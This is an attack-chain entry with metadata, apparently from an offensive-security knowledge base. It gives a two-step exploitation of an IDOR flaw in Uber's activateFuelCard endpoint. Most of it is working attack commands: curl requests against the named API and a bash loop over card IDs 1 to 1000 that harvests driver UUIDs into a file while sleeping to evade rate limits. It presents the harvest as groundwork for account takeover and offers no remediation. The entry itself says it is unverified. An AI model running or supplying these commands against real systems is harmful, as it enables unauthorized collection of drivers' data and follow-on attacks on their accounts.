---
tags:
  - idor
  - enumeration
  - api
  - uber
  - driver-data
type: attack_chain
tools: []
tactics:
  - '[[Discovery]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-IDOR-in-activateFuelCard-to-Enumerate-Driver-UUIDs]]'
step_count: 2
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:25:29.913Z'
description: >-
  A multi-step attack exploiting an Insecure Direct Object Reference (IDOR) in
  Uber's activateFuelCard endpoint to enumerate driver UUIDs at scale, enabling
  potential follow-on attacks like account takeover.
skill_level: intermediate
impact_level: high
id: 587e3063-17e1-4d46-87a1-406981652022
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# IDOR in Uber Fuel Card Activation Endpoint for Bulk Driver UUID Enumeration

Multi-stage attack chain demonstrating exploitation of an IDOR vulnerability in Uber's activateFuelCard endpoint to collect driver UUIDs without authorization.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Endpoint Discovery and Testing] --> B[UUID Enumeration]
    B --> C[Data Collection for Follow-on Attacks]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses standard HTTP clients like curl)

### Target Environment

- Web platform
- Uber API services
- Authenticated session (driver account access)

### Initial Access Requirements

- Valid Uber driver credentials for authentication
- Network access to Uber's API endpoints
- No prior elevated access needed

## Detailed Attack Procedures

### Step 1: Identify and Test activateFuelCard Endpoint
procedure: [[procedures/Exploit-IDOR-in-activateFuelCard-to-Enumerate-Driver-UUIDs]]

**Objective**: Discover the IDOR vulnerability by testing the endpoint with sequential card IDs to reveal unauthorized driver UUID access.

**Instructions**: Authenticate to Uber's API and send a test request to the activateFuelCard endpoint using a sequential card ID (e.g., 1). Use [[commands/curl-activatefuelcard-test]] to probe:

```bash
curl -X POST 'https://api.uber.com/v1/fuelcards/activate' \
  -H 'Authorization: Bearer YOUR_ACCESS_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"card_id": 1}'
```

The response will include the associated driver's UUID if the card exists, confirming lack of ownership checks.

**Expected Output**: JSON response containing driver's UUID, e.g., {"driver_uuid": "abc123-def456"}.

**Success Indicators**:
- Driver UUID returned for a card ID not owned by the authenticated user
- No authorization error (e.g., 403 Forbidden)

### Step 2: Enumerate Multiple Driver UUIDs
procedure: [[procedures/Exploit-IDOR-in-activateFuelCard-to-Enumerate-Driver-UUIDs]]

**Objective**: Scale the enumeration by iterating through sequential card IDs to collect bulk driver UUIDs for potential further exploitation.

**Instructions**: Script or manually loop through card IDs (e.g., 1 to 1000) using [[commands/curl-activatefuelcard-enumerate]] to send repeated requests and log UUIDs:

```bash
for i in {1..1000}; do
  curl -s -X POST 'https://api.uber.com/v1/fuelcards/activate' \
    -H 'Authorization: Bearer YOUR_ACCESS_TOKEN' \
    -H 'Content-Type: application/json' \
    -d "{\"card_id\": $i}" | jq -r '.driver_uuid' >> driver_uuids.txt
  sleep 0.1  # Rate limiting avoidance

done
```

Filter out empty responses to build a list of valid UUIDs.

**Expected Output**: A file (driver_uuids.txt) with collected UUIDs, e.g., one per line.

**Success Indicators**:
- Multiple unique UUIDs collected without rate limiting or blocks
- No ownership verification errors across requests

## Attack Chain Summary

### Key Achievements

1. Confirmed IDOR in activateFuelCard endpoint allowing unauthorized access to driver data.
2. Enumerated hundreds of driver UUIDs in minutes.
3. Enabled potential chaining to account takeover or data exposure attacks.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Account Discovery]]

### MITRE ATT&CK Tactics

- [[Discovery]]

---
*Last updated: 2023-10-01T00:00:00Z*
